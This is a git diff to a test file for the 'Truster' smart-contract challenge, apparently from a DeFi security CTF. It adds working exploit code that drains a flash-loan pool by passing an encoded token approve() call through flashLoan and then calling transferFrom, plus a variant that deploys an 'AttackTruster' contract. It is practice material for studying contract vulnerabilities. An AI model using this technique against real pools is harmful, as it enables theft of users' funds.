@@ -23,6 +23,64 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        return;
+        console.log("---Mutli-Transactrion Solution (using only client side scripting)---");
+
+        let poolBalance = await token.balanceOf(pool.address);
+        let playerBalance = await token.balanceOf(player.address);
+        console.log("BEFORE");
+        console.log("Pool   balance: ", poolBalance);
+        console.log("Player balance: ", playerBalance);
+        console.log();
+
+        const data = token.interface.encodeFunctionData("approve(address,uint256)", [player.address, poolBalance]);
+        console.log('data: ');
+        console.log(data);
+        console.log();
+
+        await pool.flashLoan(0n, player.address, token.address, data);
+        console.log("Loan completed...");
+        console.log();
+
+        let allowBalance = await token.allowance(pool.address, player.address);
+        console.log("Player Allowance: ", allowBalance);
+        console.log();
+
+        await token.connect(player).transferFrom(pool.address, player.address, poolBalance);
+        console.log("Money grab...");
+        console.log();
+
+        poolBalance = await token.balanceOf(pool.address);
+        playerBalance = await token.balanceOf(player.address);
+        console.log("AFTER");
+        console.log("Pool   balance: ", poolBalance);
+        console.log("Player balance: ", playerBalance);
+        console.log();
+    });
+
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        let poolBalance = await token.balanceOf(pool.address);
+        let playerBalance = await token.balanceOf(player.address);
+
+        console.log("---Single Transactrion Solution (using a contract to execute attack)---");
+        console.log("BEFORE");
+        console.log("Pool   balance: ", poolBalance);
+        console.log("Player balance: ", playerBalance);
+        console.log();
+
+        await (await ethers.getContractFactory('AttackTruster', deployer)).deploy(
+            pool.address,
+            token.address,
+            player.address,
+            poolBalance);
+
+        poolBalance = await token.balanceOf(pool.address);
+        playerBalance = await token.balanceOf(player.address);
+        console.log("AFTER");
+        console.log("Pool   balance: ", poolBalance);
+        console.log("Player balance: ", playerBalance);
+        console.log();
     });
 
     after(async function () {
@@ -37,4 +95,3 @@ describe('[Challenge] Truster', function () {
         ).to.equal(0);
     });
 });
-
